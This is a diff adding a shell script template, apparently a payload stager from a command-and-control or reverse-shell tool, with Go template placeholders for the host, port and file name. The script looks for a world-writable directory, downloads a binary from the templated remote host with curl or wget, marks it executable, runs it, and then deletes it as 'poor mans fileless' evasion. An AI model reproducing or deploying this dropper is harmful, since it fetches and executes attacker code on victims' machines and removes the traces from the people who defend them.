@@ -1,0 +1,25 @@
+#!/bin/sh
+export PATH="$PATH:/usr/local/sbin:/usr/local/bin:/usr/bin:/bin:/sbin"
+
+
+for i in "~" "." $(find / -maxdepth 3 -type d \( -perm -o+w \)); do
+
+    if ! touch $i/{{.Name}}; then 
+        continue
+    fi
+
+    if command -v curl &> /dev/null; then
+        curl {{.Protocol}}://{{.Host}}:{{.Port}}/{{.Name}} -o "$i/{{.Name}}"
+    elif command -v  wget &> /dev/null; then
+        wget -O "$i/{{.Name}}" {{.Protocol}}://{{.Host}}:{{.Port}}/{{.Name}}
+    fi
+
+    chmod +x "$i/{{.Name}}"
+    if ! "$i/{{.Name}}"; then 
+        continue
+    fi
+    #Poor mans fileless
+    rm "$i/{{.Name}}"
+
+    break
+done
